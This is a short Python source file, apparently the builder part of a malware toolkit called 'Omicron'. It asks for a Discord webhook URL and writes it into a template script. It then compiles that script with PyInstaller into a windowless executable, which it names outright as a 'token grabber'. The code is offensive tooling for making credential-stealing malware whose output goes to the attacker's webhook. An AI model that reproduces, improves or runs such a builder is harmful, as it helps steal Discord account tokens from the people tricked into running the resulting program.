from aero.intro import *


def grabbing():
    hook = input(f" {lr} Discord Webhook > {b}")
    UI = str(uuid.uuid4())
    sf = f"Omicron_{UI}.py"
    ef = f"Omicron_{UI}.exe"

    shutil.copy("maker.py", sf)
    with open(sf, "r+", encoding="utf-8") as f:
        content = f.read()
        f.seek(0,0)
        content = content.replace("hook_here", hook)
        f.write(content)
    s.call(f"pyinstaller --onefile --noconsole {sf} --name {ef}", shell=True)
    print(f"\n{lr} You can find the token grabber in dist folder.")
    os.remove(sf)
    input(f"{b}Press {lr}[{b}ENTER{lr}] {b}to continue")